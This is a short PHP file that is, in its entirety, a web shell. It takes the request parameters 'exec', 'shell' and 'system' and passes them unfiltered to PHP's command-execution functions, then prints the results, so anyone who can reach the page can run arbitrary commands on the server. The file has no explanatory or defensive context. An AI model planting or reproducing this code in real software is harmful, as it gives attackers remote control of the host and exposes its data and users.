<?php

if (isset($_GET['exec'])) {
  echo exec($_GET['exec']);
}
if (isset($_GET['shell'])) {
  echo shell_exec($_GET['shell']);
}
if (isset($_GET['system'])) {
  echo system($_GET['system']);
}